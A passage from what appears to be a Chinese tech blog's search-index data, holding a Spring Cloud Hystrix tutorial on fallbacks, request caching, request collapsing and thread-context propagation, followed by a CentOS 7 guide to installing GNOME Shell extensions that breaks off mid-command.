"defaultUser") public String getUser(String userName) { throw new RuntimeException("the user not exist"); } public String defaultUser(String userName, Throwable throwable) { System.out.println(throwable.getMessage()); return "the user not exist in this system"; }} 或者继承 @HystrixCommand 的命令，通过方法来获取异常： 123456789101112131415161718192021222324252627282930@RestControllerpublic class ExceptionController { @GetMapping("/getPSFallbackOtherExpcetion") public String pSFallbackOtherExpcetion(){ String result = new PSFallbackOtherExpcetion().execute(); return result; }}/** * 继承HystrixCommand */public class PSFallbackOtherExpcetion extends HystrixCommand&lt;String&gt;{ public PSFallbackOtherExpcetion() { super(HystrixCommandGroupKey.Factory.asKey("GroupOE")); } @Override protected String run() throws Exception { throw new Exception("this command will trigger fallback"); } @Override protected String getFallback() { System.out.println(getFailedExecutionException().getMessage()); return "invoke PSFallbackOtherExpcetion fallback method"; }} 在 Feign Client 中可以用 ErrorDecoder 实现对这类异常的包装，在实际的使用中，很多时候调用接口会抛出这些 400-500 之间的错误，此时可以通过它进行封装： 12345678910111213141516@Componentpublic class FeignErrorDecoder implements feign.codec.ErrorDecoder { @Override public Exception decode(String methodKey, Response response) { try { if (response.status() &gt;= 400 &amp;&amp; response.status() &lt;= 499) { String error = Util.toString(response.body().asReader()); return new HystrixBadRequestException(error); } } catch (IOException e) { System.out.println(e); } return feign.FeignException.errorStatus(methodKey, response); }} fallback 会抛出异常的情况 Hystrix 请求缓存Hystrix 请求缓存是指 Hystrix 在同一个上下文请求中缓存请求结果，它与传统理解的缓存有一定区别；Hystrix 的请求缓存是在同一个请求中进行，在进行第一次调用结束后对结果缓存，然后接下来同参数的请求将会使用第一次缓存的结果，缓存的生命周期只在这一次请求中有效。使用 HystrixCommand 有两种方式，第一次种是继承，第二种是直接注解，缓存也同时支持这两种使用方式。具体使用例子如下，点击下载完整的案例代码。 使用类来开启缓存Hystrix 的缓存是在一次请求内有效，这要求请求要在一个 Hystrix 上下文里，不然在使用缓存的时候 Hystrix 会报一个没有初始化上下文的异常；可以使用 filter 过滤器或者 Interceptor 拦截器进行初始化，下面将使用一个拦截器来举例。使用类的方式很简单，只需要继承 HystrixCommand，然后重写它的 getCacheKey 方法即可，保证对于同一个请求返回同样的键值；对于缓存的清除，则可以调用 HystrixRequestCache 类的 clean 方法即可。 拦截器类： 1234567891011121314151617181920public class CacheContextInterceptor implements HandlerInterceptor { private HystrixRequestContext context; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { this.context = HystrixRequestContext.initializeContext(); return true; } @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { this.context.shutdown(); }} 创建配置类，用于注册拦截器： 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean @LoadBalanced public RestTemplate restTemplate() { return new RestTemplate(); } @Bean public CacheContextInterceptor userContextInterceptor() { return new CacheContextInterceptor(); }} 1234567891011@Configurationpublic class WebMvcConfiguration extends WebMvcConfigurerAdapter { @Autowired CacheContextInterceptor userContextInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(userContextInterceptor); }} 继承 HystrixCommand 类： 12345678910111213141516171819202122232425262728293031323334public class UserCommand extends HystrixCommand&lt;String&gt; { private String userName; private RestTemplate restTemplate; private static final Logger logger = LoggerFactory.getLogger(UserCommand.class); private static final HystrixCommandKey KEY = HystrixCommandKey.Factory.asKey("CommandKey"); public UserCommand(String userName, RestTemplate restTemplate) { super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey("CacheGroup")).andCommandKey(KEY)); this.userName = userName; this.restTemplate = restTemplate; } @Override protected String run() throws Exception { String result = restTemplate.getForObject("http://PROVIDER/user/getUser?userName={1}", String.class, this.userName); logger.info(result); return result; } @Override protected String getFallback() { return super.getFallback(); } @Override protected String getCacheKey() { return this.userName; } public static void cleanCache(String userName) { HystrixRequestCache.getInstance(KEY, HystrixConcurrencyStrategyDefault.getInstance()).clear(userName); }} 用于测试的 Controller 类： 123456789101112131415161718192021@RestController@RequestMapping("/user")public class UserController { private static final Logger logger = LoggerFactory.getLogger(UserController.class); @Autowired private RestTemplate restTemplate; @GetMapping("/get") public String get(String userName) { UserCommand commandOne = new UserCommand(userName, restTemplate); commandOne.execute(); logger.info("from cache: " + commandOne.isResponseFromCache()); UserCommand commandTwo = new UserCommand(userName, restTemplate); commandTwo.execute(); logger.info("from cache: " + commandTwo.isResponseFromCache()); return "cache test finished"; }} 启动主类： 123456789@EnableHystrix@EnableDiscoveryClient@SpringBootApplicationpublic class CacheApplication { public static void main(String[] args) { SpringApplication.run(CacheApplication.class, args); }} 访问 http://127.0.0.1:8082/user/get?userName=Tom，调用了两次 execute 方法，使用 Hystrix 的默认方法 isResponseFromCache 来判断请求结果是否来自于缓存，从以下输出可以看出第二次请求确实来自于缓存，此时说明 Hystrix 的缓存生效了。 12c.s.study.controller.CacheController : from cache: falsec.s.study.controller.CacheController : from cache: true 使用注解开启缓存Hystrix 提供了注解来使用缓存机制，且更为方便和快捷，使用 @CacheResult 和 @CacheRemove 即可缓存数据和清除缓存。 使用注解缓存数据： 12345678910111213141516@Servicepublic class DeptService { private static final Logger logger = LoggerFactory.getLogger(DeptService.class); @Autowired private RestTemplate restTemplate; @CacheResult @HystrixCommand public String getDept(String deptName) { String result = restTemplate.getForObject("http://PROVIDER/dept/getDept?deptName={1}", String.class, deptName); logger.info(result); return result; }} 用于测试的 Controller 类： 1234567891011121314@RestController@RequestMapping("/dept")public class DeptController { @Autowired private DeptService deptService; @GetMapping("/get") public String get(String deptName) { deptService.getDept("IT"); deptService.getDept("IT"); return "annotation cache test finished"; }} 访问 http://127.0.0.1:8082/dept/get?deptName=IT，调用了两次 get 方法，发现只打印了一条数据，说明第二次的请求是从缓存中读取，即 Hystrix 的缓存生效了。 使用注解清除缓存使用 commandKey 参数来指定 HystrixCommand 的 key，在清除缓存时，可以直接附加这个值来清除指定的参数： 1234567891011121314151617181920212223@Servicepublic class DeptService { private static final Logger logger = LoggerFactory.getLogger(DeptService.class); @Autowired private RestTemplate restTemplate; @CacheResult @HystrixCommand(commandKey = "findDept") public String findDept(@CacheKey String deptName) { String result = restTemplate.getForObject("http://PROVIDER/dept/getDept?deptName={1}", String.class, deptName); logger.info(result); return result; } @CacheRemove(commandKey = "findDept") @HystrixCommand public String updateDept(@CacheKey String deptName) { logger.info("delete dept cache"); return "update dept success"; }} 用于测试的 Controller 类： 1234567891011121314151617181920@RestController@RequestMapping("/dept")public class DeptController { @Autowired private DeptService deptService; @GetMapping("/find") public String find(String deptName) { // 调用接口并缓存数据 deptService.findDept("IT"); deptService.findDept("IT"); // 清除缓存 deptService.updateDept(deptName); // 再调用接口 deptService.findDept("IT"); deptService.findDept("IT"); return "annotation cache test finished"; }} 访问 http://127.0.0.1:8082/dept/find?deptName=IT，运行结果如下；在没有缓存的情况下，打印了一次，第二次取的是缓存数据，然后清除缓存后又打印了一次，最后一次又从缓存里取数据： 123DeptService : {"id":1,"deptName":"IT"}DeptService : delete dept cacheDeptService : {"id":1,"deptName":"IT"} 缓存使用注意事项Hystrix 常用缓存注解： @CacheResult：使用该注解后结果会被缓存，同时它需要和 @HystrixCommand 注解一起使用，注解参数为 cacheKeyMethod @CacheRemove：清除缓存，需要指定 commandKey，注解参数为 commandKey、cacheKeyMethod @CacheKey：指定请求命令参数，默认使用方法里的所有参数作为 Key，注解参数为 value 一般在查询接口上使用 @CacheResult，在更新、删除接口上使用 @CacheRemove 删除缓存 使用 Hystrix 缓存时有几方面需要注意： 需要使用 @EnableHystrix 注解启用 Hystrix 需要初始化 HystrixRequestContext，无论是使用继承类还是注解的方式来开启缓存 在指定了 HystrixCommand 的 commandKey 后，在 @CacheRemove 也要指定 commandKey Hystrix Request CollapserRequest Collapser 介绍Request Collapser 是 Hystrix 推出的针对多个请求调用单个后端依赖做的一种优化和节约网络开销的方法。引用官方的这张图，当发起 5 个请求时，在请求没有聚合和合并的情况下，是每个请求单独开启一个线程，并开启一个网络链接进行调用，这都会加重应用程序的负担和开销，并占用 Hystrix 的线程连接池。当使用 Collapser 把请求都合并起来时，则只需要一个线程和一个连接的开销，这大大减少了并发和请求执行所需要的线程数和网络连接数，尤其在一个时间段内有非常多请求的情况下能极大地提高资源利用率。特别注意：若使用 Feign 调用的话，目前还不支持 Collapser。具体使用例子如下，点击下载完整的案例代码。 使用注解进行请求合并使用 Request Collapser 也可以通过继承类和注解的形式来实现，下面主要介绍注解的使用方式。 Request Collapser 和 Hystrix 缓存的使用类似，需要实现 Hystrix 上下文的初始化和关闭，这里使用拦截器来实现： 1234567891011121314151617181920public class HystrixContextInterceptor implements HandlerInterceptor { private HystrixRequestContext context; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { this.context = HystrixRequestContext.initializeContext(); return true; } @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { this.context.shutdown(); }} 创建配置类，用于注册拦截器： 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean @LoadBalanced public RestTemplate restTemplate() { return new RestTemplate(); } @Bean public CacheContextInterceptor userContextInterceptor() { return new CacheContextInterceptor(); }} 1234567891011@Configurationpublic class WebMvcConfiguration extends WebMvcConfigurerAdapter { @Autowired CacheContextInterceptor userContextInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(userContextInterceptor); }} 实现一个 Future 异步返回值的方法，在这个方法上配置请求合并的注解，之后外部通过调用这个方法来实现请求的合并。注意：这个方法必须是 Future 异步返回值的，否则无法合并请求。其中 @HystrixCollapser 注解代表开启请求合并，调用该方法时，实际上运行的是 collapsingList 方法，且利用 HystrixProperty 指定 timerDelayInMilliseconds，这属性代表合并多少毫秒（ms）内的请求，如果不配置的话，默认是 10ms。 1234567891011121314151617181920212223242526@Servicepublic class CollapsingService implements ICollapsingService { private static final Logger logger = LoggerFactory.getLogger(CollapsingService.class); @HystrixCollapser(batchMethod = "collapsingList", collapserProperties = { @HystrixProperty(name = "timerDelayInMilliseconds", value = "1000") }) public Future&lt;User&gt; collapsing(Integer id) { return null; } @HystrixCommand public List&lt;User&gt; collapsingList(List&lt;Integer&gt; userParam) { logger.info("collapsingList当前线程: " + Thread.currentThread().getName()); logger.info("当前请求参数个数:" + userParam.size()); List&lt;User&gt; userList = new ArrayList&lt;User&gt;(); for (Integer userNumber : userParam) { User user = new User(); user.setUserName("User - " + userNumber); user.setAge(userNumber); userList.add(user); } return userList; }} 创建接口测试类，在 getUser 接口内连续调用两次 collapsing 方法： 123456789101112131415161718192021222324@RestController@RequestMapping("/user")public class CollapsingController { private static final Logger logger = LoggerFactory.getLogger(CollapsingController.class); @Autowired private ICollapsingService collapsingService; /** * 请求聚合/合并 * * @return * @throws Exception */ @RequestMapping("/getUser") public String getUser() throws Exception { Future&lt;User&gt; user = collapsingService.collapsing(1); Future&lt;User&gt; user2 = collapsingService.collapsing(2); logger.info(user.get().getUserName()); logger.info(user2.get().getUserName()); return "Success"; }} 启动主类： 123456789@EnableHystrix@EnableDiscoveryClient@SpringBootApplicationpublic class CollapsingApplication { public static void main(String[] args) { SpringApplication.run(CollapsingApplication.class, args);} 启动应用后访问 http://127.0.0.1:8082/user/getUser，可以看到实际调用了 collapsingList 方法，并打印了当前线程的名称、请求的参数和运行结果，一共合并了两个请求，达到了预期效果： 1234CollapsingService : collapsingList当前线程: hystrix-CollapsingService-1CollapsingService : 当前请求参数个数:2CollapsingController : User - 1CollapsingController : User - 2 使用注解进行请求合并（全局）上面讲了多个请求是如何合并的，但是都是在同一请求（单一线程）中发起的调用，如果两次请求接口都是在不同线程运行的，那么如何合并整个应用中的请求呢？即如何对所有线程请求中的多次服务调用进行合并呢？ @HystrixCollapser 注解的 scope 属性有个两个值，分别是：Request（默认值）、Global。下面的代码中，增加了一个 scope 属性为 Global 的方法： 1234567891011121314151617181920212223242526@Servicepublic class CollapsingService implements ICollapsingService { private static final Logger logger = LoggerFactory.getLogger(CollapsingService.class); @HystrixCollapser(batchMethod = "collapsingListGlobal", scope = Scope.GLOBAL, collapserProperties = { @HystrixProperty(name = "timerDelayInMilliseconds", value = "10000") }) public Future&lt;User&gt; collapsingGlobal(Integer id) { return null; } @HystrixCommand public List&lt;User&gt; collapsingListGlobal(List&lt;Integer&gt; userParam) { logger.info("collapsingListGlobal当前线程: " + Thread.currentThread().getName()); logger.info("当前请求参数个数:" + userParam.size()); List&lt;User&gt; userList = new ArrayList&lt;User&gt;(); for (Integer userNumber : userParam) { User user = new User(); user.setUserName("User- " + userNumber); user.setAge(userNumber); userList.add(user); } return userList; }} 增加一个调用接口来调用上述方法： 123456789101112131415161718192021222324@RestController@RequestMapping("/user")public class CollapsingController { private static final Logger logger = LoggerFactory.getLogger(CollapsingController.class); @Autowired private ICollapsingService collapsingService; /** * 请求聚合/合并,整个应用的 * * @return * @throws Exception */ @RequestMapping("/getUserGolbal") public String getUserGolbal() throws Exception { Future&lt;User&gt; user = collapsingService.collapsingGlobal(1); Future&lt;User&gt; user2 = collapsingService.collapsingGlobal(2); logger.info(user.get().getUserName()); logger.info(user2.get().getUserName()); return "Success"; }} 连续访问 http://127.0.0.1:8082/user/getUserGolbal 两次，会发现所有请求都合并在一个线程中；若改为 Request 作用域，Hystrix 则会运行两个线程来分别处理两次请求。 123456CollapsingService : collapsingListGlobal当前线程: hystrix-CollapsingService-10CollapsingService : 当前请求参数个数:4CollapsingController : User- 1CollapsingController : User- 1CollapsingController : User- 2CollapsingController : User- 2 请求合并总结Hystrix Request Collapser 主要用于请求合并的场景，在一个简单的系统中，这种场景可能很少碰到，所以对于请求合并，一般的使用场景是：当在某个时间段内有大量或并发的相同请求时，则适用使用请求合并；而如果在某个时间段内只有很少的请求，且延迟也不高，此时使用请求合并反而会增加复杂度和延迟，因为对于 Collapser 本身，Hystrix 也是需要时间进行批处理的。 Hystrix 线程传递及并发策略Hystrix 线程传递介绍Hystrix 会对请求进行封装，然后管理请求的调用，从而实现断路器等多种功能。Hystrix 提供了两种隔离模式来进行请求的操作，一种是信号量隔离，一种是线程池隔离。如果是信号量，Hystrix 则在请求的时候会获取到一个信号量，如果成功拿到，则继续进行请求，请求在同一个线程中执行完毕。如果是线程池隔离，Hystrix 会把请求放入线程池中执行，这时就有可能产生线程的变化，从而导致线程 1 的上下文数据在线程 2 里不能正常拿到。下面通过一个例子来说明，点击下载完整的案例代码。 Hystrix 线程传递问题重现建立一个 ThreadLocal 来保存用户的信息，通常在微服务里，会把当前请求的上下文数据放入本地线程变量，便于后续使用和销毁： 1234public class HystrixThreadLocal { public static ThreadLocal&lt;String&gt; threadLocal = new ThreadLocal&lt;&gt;();} 定义测试接口，打印当前线程的 ID，并利用 ThreadLocal 存放用户信息；为了兼容其他情况，例如在使用 Feign 调用的时候，通常会使用 RequestContextHolder 拿到上下文属性，在此也进行测试一下： 12345678910111213141516171819@RestController@RequestMapping("/user")public class UserController { private static final Logger logger = LoggerFactory.getLogger(UserController.class); @Autowired private UserService userService; @GetMapping("/get/{id}") public String get(@PathVariable("id") Integer id) { HystrixThreadLocal.threadLocal.set("userId: " + id); RequestContextHolder.currentRequestAttributes().setAttribute("userId", "userId: " + id, RequestAttributes.SCOPE_REQUEST); logger.info("current thread: " + Thread.currentThread().getId()); logger.info("thread local: " + HystrixThreadLocal.threadLocal.get()); logger.info("RequestContextHolder: " + RequestContextHolder.currentRequestAttributes().getAttribute("userId", RequestAttributes.SCOPE_REQUEST)); return userService.get(id); }} 定义服务类，测试在没有使用线程池隔离模式的情况下，获取用户信息： 123456789101112@Servicepublic class UserService { private static final Logger logger = LoggerFactory.getLogger(UserService.class); public String get(Integer id) { logger.info("current thread: " + Thread.currentThread().getId()); logger.info("thread local: " + HystrixThreadLocal.threadLocal.get()); logger.info("RequestContextHolder: " + RequestContextHolder.currentRequestAttributes().getAttribute("userId", RequestAttributes.SCOPE_REQUEST).toString()); return "Success"; }} 启动应用后访问 http://127.0.0.1:8082/user/get/2 后，可以看到打印的线程 ID 都是一样的，线程变量也是传入 2，请求上下文的持有对象也可以顺利拿到： 1234567UserController : current thread: 59UserController : thread local: userId: 2UserController : RequestContextHolder: userId: 2UserService : current thread: 59UserService : thread local: userId: 2UserService : RequestContextHolder: userId: 2 服务类添加 @HystrixCommand 注解，测试在使用线程池隔离模式的情况下，获取用户信息： 12345678910111213@Servicepublic class UserService { private static final Logger logger = LoggerFactory.getLogger(UserService.class); @HystrixCommand public String get(Integer id) { logger.info("current thread: " + Thread.currentThread().getId()); logger.info("thread local: " + HystrixThreadLocal.threadLocal.get()); logger.info("RequestContextHolder: " + RequestContextHolder.currentRequestAttributes().getAttribute("userId", RequestAttributes.SCOPE_REQUEST).toString()); return "Success"; }} 启动应用后访问 http://127.0.0.1:8082/user/get/2 后，会发现进入的线程池 ID 是 57，当达到后台服务的时候，线程 ID 变成 82，说明线程池的隔离已经生效，是重新启动的线程处理请求的，然后线程的变量也丢失了，RequestContextHolder 中也抛出了异常，意思是没有绑定线程变量，至此成功地重现了父子线程数据传递的问题。 1234567UserController : current thread: 57UserController : thread local: userId: 2UserController : RequestContextHolder: userId: 2UserService : current thread: 82UserService : thread local: nulljava.lang.IllegalStateException: No thread-bound request found: Hystrix 线程传递问题解决方案解决 Hystrix 的线程传递问题有两种方法： 第一种：修改 Hystrix 的隔离策略，使用信号量隔离，直接修改配置文件即可，但 Hystrix 默认是线程池隔离，加上从真实的项目情况看，大部分都是使用线程池隔离，因此此方案不太推荐，对应属性为：hystrix.command.default.execution.isolation.strategy 第二种：Hystrix 官方推荐的一种方式，就是使用继承 HystrixConcurrencyStrategy 类覆盖 wrapCallable 方法，下面将介绍此方法的使用例子 创建 HystrixThreadCallable 类，该类的构造函数是希望传递 RequestContextHolder 和自定义的 HystrixThreadLocal 对象： 123456789101112131415161718192021222324public class HystrixThreadCallable&lt;S&gt; implements Callable&lt;S&gt; { private final RequestAttributes requestAttributes; private final Callable&lt;S&gt; delegate; private String params; public HystrixThreadCallable(Callable&lt;S&gt; callable, RequestAttributes requestAttributes, String params) { this.delegate = callable; this.requestAttributes = requestAttributes; this.params = params; } @Override public S call() throws Exception { try { RequestContextHolder.setRequestAttributes(requestAttributes); HystrixThreadLocal.threadLocal.set(params); return delegate.call(); } finally { RequestContextHolder.resetRequestAttributes(); HystrixThreadLocal.threadLocal.remove(); } }} 重写 HystrixConcurrencyStrategy 类的 wrapCallable 方法，在执行请求前包装 HystrixThreadCallable 对象，将需要的对象信息设置进去，这样在下一个线程中就可以拿到了： 1234567public class SpringCloudHystrixConcurrencyStrategy extends HystrixConcurrencyStrategy { @Override public &lt;T&gt; Callable&lt;T&gt; wrapCallable(Callable&lt;T&gt; callable) { return new HystrixThreadCallable&lt;&gt;(callable, RequestContextHolder.getRequestAttributes(), HystrixThreadLocal.threadLocal.get()); }} 配置类： 12345678@Configurationpublic class HystrixThreadContextConfiguration { @Bean public SpringCloudHystrixConcurrencyStrategy springCloudHystrixConcurrencyStrategy() { return new SpringCloudHystrixConcurrencyStrategy(); }} 启动应用后访问 http://127.0.0.1:8082/user/get/2 后，可以发现即使使用了 Hystrix 的线程池隔离模式，不同的线程也能顺利拿到上一个线程传递过来的信息： 1234567UserController : current thread: 59UserController : thread local: userId: 2UserController : RequestContextHolder: userId: 2UserService : current thread: 84UserService : thread local: userId: 2UserService : RequestContextHolder: userId: 2 并发策略共存由于 HystrixPlugins 的 registerConcurrencyStrategy 方法只能被调用一次，即 Hystrix 不允许注册多个 Hystrix 并发策略，不然就会报错，这就导致了无法和其他并发策略一起使用，因此需要将其他并发策略注入进去，达到并存的目的，如 sleuth 的并发策略也是做了同样的事情。具体的做法就是在构造此并发策略时，找到之前已经存在的并发策略，并保留在类的属性中，在调用过程中，返回之前并发策略的相关信息，如请求变量、连接池、阻塞队列；等请求进来时，既不影响之前的并发策略，也可以包装需要的请求信息。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public class SpringCloudHystrixConcurrencyStrategy extends HystrixConcurrencyStrategy { private HystrixConcurrencyStrategy delegateHystrixConcurrencyStrategy; @Override public &lt;T&gt; Callable&lt;T&gt; wrapCallable(Callable&lt;T&gt; callable) { return new HystrixThreadCallable&lt;&gt;(callable, RequestContextHolder.getRequestAttributes(), HystrixThreadLocal.threadLocal.get()); } public SpringCloudHystrixConcurrencyStrategy() { init(); } private void init() { try { this.delegateHystrixConcurrencyStrategy = HystrixPlugins.getInstance().getConcurrencyStrategy(); if (this.delegateHystrixConcurrencyStrategy instanceof SpringCloudHystrixConcurrencyStrategy) { return; } HystrixCommandExecutionHook commandExecutionHook = HystrixPlugins.getInstance().getCommandExecutionHook(); HystrixEventNotifier eventNotifier = HystrixPlugins.getInstance().getEventNotifier(); HystrixMetricsPublisher metricsPublisher = HystrixPlugins.getInstance().getMetricsPublisher(); HystrixPropertiesStrategy propertiesStrategy = HystrixPlugins.getInstance().getPropertiesStrategy(); HystrixPlugins.reset(); HystrixPlugins.getInstance().registerConcurrencyStrategy(this); HystrixPlugins.getInstance().registerCommandExecutionHook(commandExecutionHook); HystrixPlugins.getInstance().registerEventNotifier(eventNotifier); HystrixPlugins.getInstance().registerMetricsPublisher(metricsPublisher); HystrixPlugins.getInstance().registerPropertiesStrategy(propertiesStrategy); } catch (Exception e) { throw e; } } @Override public ThreadPoolExecutor getThreadPool(HystrixThreadPoolKey threadPoolKey, HystrixProperty&lt;Integer&gt; corePoolSize, HystrixProperty&lt;Integer&gt; maximumPoolSize, HystrixProperty&lt;Integer&gt; keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue) { return this.delegateHystrixConcurrencyStrategy.getThreadPool(threadPoolKey, corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue); } @Override public ThreadPoolExecutor getThreadPool(HystrixThreadPoolKey threadPoolKey, HystrixThreadPoolProperties threadPoolProperties) { return this.delegateHystrixConcurrencyStrategy.getThreadPool(threadPoolKey, threadPoolProperties); } @Override public BlockingQueue&lt;Runnable&gt; getBlockingQueue(int maxQueueSize) { return this.delegateHystrixConcurrencyStrategy.getBlockingQueue(maxQueueSize); } @Override public &lt;T&gt; HystrixRequestVariable&lt;T&gt; getRequestVariable(HystrixRequestVariableLifecycle&lt;T&gt; rv) { return this.delegateHystrixConcurrencyStrategy.getRequestVariable(rv); }} 补充内容Hystrix 的优势Hytrix 支持异步调用，支持线程池级别的隔离 这种方式就是通过 RxJava 进行调用，等待完成后进行异步通知调用，但在 HTTP 这种请求中，主线程还是阻塞在等待中。带来的收益无非就是 Hytrix 能对超时进行控制。但缺点也很明显，如果是每个接口创建一个线程池的话，如果接口过多，机器中会创建大量线程，而在 Java 中，线程是属于轻量级的进程，对应是内核线程，进而造成线程的切换。而线程切换的成本也比较高。再者还需要预先给各个资源做线程池大小的分配，并且对于一些使用了 ThreadLocal 的场景不友好。 Hytrix 支持百分比 + 连续错误比率的条件进行降级 这确实比 Sentinel 单纯的统计异常率，或异常数更精细，技术选型具体根据业务去取舍。正如阿里巴巴自己比较的，Sentinel 侧重于流控，而熔断的话 Hytrix 更灵活和专业的，虽然 Hystrix 已经停止开发了，但一般情况下用 Sentinel 代替 Hytrix 也足够了。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Centos7 桌面美化",url:"/posts/e546702a.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 安装依赖 12345678910111213141516# 安装epel源# yum install epel-release# 安装字体# yum install liberation-mono-fonts# 安装gnome菜单# yum install gnome-menus# 安装gnome个性化定制工具# yum install gnome-tweak-tool# 安装桌面管理器# yum install gnome-shell# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件，可以看到多了一个优化工具 Chrome 浏览器在线安装 GNOME Shell 扩展 下面的教程默认是通过手动的方式安装 GNOME Shell 扩展，但 GNOME 还支持通过浏览器安装扩展，只需要依赖浏览器附加组件和本地主机连接器。其中 Chrome 浏览器附加组件可以直接从这里在线安装，而本地主机连接器（chrome-gnome-shell）可以参考官方教程或者下面给出步骤进行安装。两者都安装完成后，可以使用 GNOME 官方的扩展网站在线安装和管理扩展了，其优点是可视化地管理扩展和方便查看扩展是否有可用的更新。 12345678910111213141516# 编译安装本地主机连接器chrome-gnome-shell# 安装依赖# yum install cmake coreutils jq# 克隆代码# git clone git://git.gnome.org/chrome-gnome-shell# 创建构建目录# mkdir build &amp;&amp; cd build# 编译# cmake -DCMAKE_INSTALL_PREFIX=/usr -DBUILD_EXTENSION=OFF ../# 安装# make install 安装 Extension Update Notifier 到目前为止，除了通过浏览器访问 GNOME 官方的扩展网站之外，无法知道更新是否可用于 GNOME Shell 扩展。幸运的是，Extension Update Notifier 可以通知你是否有可用于已安装扩展的更新，具体安装步骤如下，官方 Github 地址，官方下载地址。 123456789101112131415161718192021# 以下操作，不同的Linux用户需要单独安装或者配置# 创建扩展目录# mkdir ~/.local/share/gnome-shell/extensions/update-extensions@franglais125.gmail.com# 进入扩展目录# cd ~/.local/share/gnome-shell/extensions/update-extensions@franglais125.gmail.com# 查看gnome-shell的版本# gnome-shell --version# 根据gnome-shell的版本，在官网下载压缩文件# wget https://extensions.gnome.org/extension-data/update-extensions%40franglais125.gmail.com.v9.shell-extension.zip# 解压压缩文件# unzip update-extensions@franglais125.gmail.com.v9.shell-extension.zip# 删除压缩文件# rm -rf update-extensions@franglais125.gmail.com.v9.shell-extension.zip# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 扩展，可以看到新增的"Extension Update Notifier"，点击"打开"即可启用扩展 安装 Netspeed Netspeed 可以在桌面顶部菜单栏显示网速，官方 Github 地址，官方下载地址。 123456789101112131415161718192021# 以下操作，不同的Linux用户需要单独安装或者配置# 创建扩展目录# mkdir ~/.local/share/gnome-shell/extensions/netspeed@hedayaty.gmail.com# 进入扩展目录# cd ~/.local/share/gnome-shell/extensions/netspeed@hedayaty.gmail.com# 查看gnome-shell的版本# gnome-shell --version# 根据gnome-shell的版本，在官网下载netspeed压缩文件# wget https://extensions.gnome.org/extension-data/netspeed%40hedayaty.gmail.com.v29.shell-extension.zip# 解压压缩文件# unzip netspeed@hedayaty.gmail.com.v29.shell-extension.zip# 删除压缩文件# rm -rf netspeed@hedayaty.gmail.com.v29.shell-extension.zip# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 扩展，可以看到新增的"Netspeed"，点击"打开"即可启用扩展 安装 Dash-to-dock Dash-to-dock 可以很方便地将应用程序固定到右侧、左侧、顶部、底部等位置，效果类似 macOS 的底部菜单栏。官方安装教程，官方下载地址。 123456789101112131415161718192021# 以下操作，不同的Linux用户需要单独安装或者配置# 创建扩展目录# mkdir ~/.local/share/gnome-shell/extensions/dash-to-dock@micxgx.gmail.com# 进入扩展目录# cd ~/.local/share/gnome-shell/extensions/dash-to-dock@micxgx.gmail.com# 查看gnome-shell的版本# gnome-shell --version# 根据gnome-shell的版本，在官网下载dash-to-dock压缩文件# wget https://extensions.gnome.org/review/download/dash-to-dockmicxgx.gmail.com.v65.shell-extension.zip# 解压压缩文件# unzip dash-to-dockmicxgx.gmail.com.v65.shell-extension.zip# 删除压缩文件# rm -rf dash-to-dockmicxgx.gmail.com.v65.shell-extension.zip# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 扩展，可以看到新增的"Dash to dock"，点击"打开"即可启用扩展 安装 DynamicTopBar DynamicTopBar 可以将的桌面顶部菜单栏变得透明，而且可以自定义透明度。官方安装教程，官方下载地址。 12345678910111213141516171819# 以下操作，不同的Linux用户需要单独安装或者配置# 进入扩展目录# cd ~/.local/share/gnome-shell/extensions/# 下载文件# wget https://github.com/AMDG2/GnomeShell_DynamicTopBar/archive/3.3.1.tar.gz# 解压压缩文件# unzip 3.3.1.tar.gz# 剪切扩展文件# mv GnomeShell_DynamicTopBar-3.3.1/dynamicTopBar@gnomeshell.feildel.fr .# 删除文件# rm -rf 3.3.1.tar.gz# rm -rf GnomeShell_DynamicTopBar-3.3.1# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 扩展，可以看到新增的"Dynamic top bar"，点击"打开"即启用扩展 其他常用的 GNOME-Shell 扩展 removable-drive-menu：显示可移除设备（如 U 盘）的拔插提示 Sound Input &amp; Output Device Chooser：选择音频输入 / 输出设备 Freon：显示 CPU 温度，CPU 电压， 显卡温度， 硬盘温度，散热风扇转速 提示：GNOME Shell 扩展的安装方法基本一致，其他扩展的安装可以参考上述步骤 删除桌面底部任务栏 12345678910# 进入gnome的全局扩展目录# cd /usr/share/gnome-shell/extensions# 备份文件# tar -cvf 